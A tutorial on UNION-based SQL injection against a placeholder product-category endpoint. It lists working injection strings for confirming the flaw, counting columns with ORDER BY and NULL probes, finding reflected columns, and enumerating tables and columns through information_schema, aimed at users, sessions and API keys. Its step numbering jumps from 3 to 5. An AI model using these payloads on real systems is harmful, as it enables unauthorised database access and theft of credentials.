# 💾 Stealing Data via SQL UNION Attack

## What a UNION-based SQL Injection is

A **UNION-based SQL injection** happens when an application:

- Builds an SQL query by concatenating untrusted input
- Returns the query results in the web response
- Can be tricked into appending a second `SELECT` statement using `UNION`

If successful, the attacker can **merge data from other tables** into the original result set and have it displayed by the application.

## When it Works (Requirements)

A `UNION` injection typically requires:

- The original query returns results that are shown in the response
- The database user has permission to read the targeted objects
- The injected `UNION SELECT` has:
  - The **same number of columns** as the original query
  - **Compatible data types** for each column position

## Example Vulnerable Scenario

Imagine an app endpoint like:
- `https://example.com/products?category=Gifts`

And the backend builds:
```sql
SELECT name, description
FROM products
WHERE category = 'Gifts'
AND released = 1;
```

## Step 1: Confirm the Injection Point

**Illustrative inputs:**
- Input that should return normal results: `Gifts`
- Input that attempts to force "true": `Gifts' OR '1'='1`
- Input that attempts to force "false": `Gifts' AND '1'='2`

If results differ, the parameter may be injectable.

## Step 2: Find the Number of Columns

### Method A: ORDER BY Probing

- `Gifts' ORDER BY 1--`
- `Gifts' ORDER BY 2--`
- `Gifts' ORDER BY 3--`

When it fails, you have exceeded the column count.

### Method B: UNION SELECT with NULLs

- `Gifts' UNION SELECT NULL--`
- `Gifts' UNION SELECT NULL, NULL--`
- `Gifts' UNION SELECT NULL, NULL, NULL--`

## Step 3: Identify Which Columns are Reflected

If you discovered 2 columns:
- `Gifts' UNION SELECT 'AAA', NULL--`
- `Gifts' UNION SELECT NULL, 'BBB'--`

## Step 5: Retrieve Interesting Database Information

**Common interesting data:**
- Database version and current user
- List of tables in the current database/schema
- List of columns for a chosen table
- Sensitive application tables (users, sessions, API keys)

## Using information_schema

List tables:
```
Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--
```

List columns:
```
Gifts' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```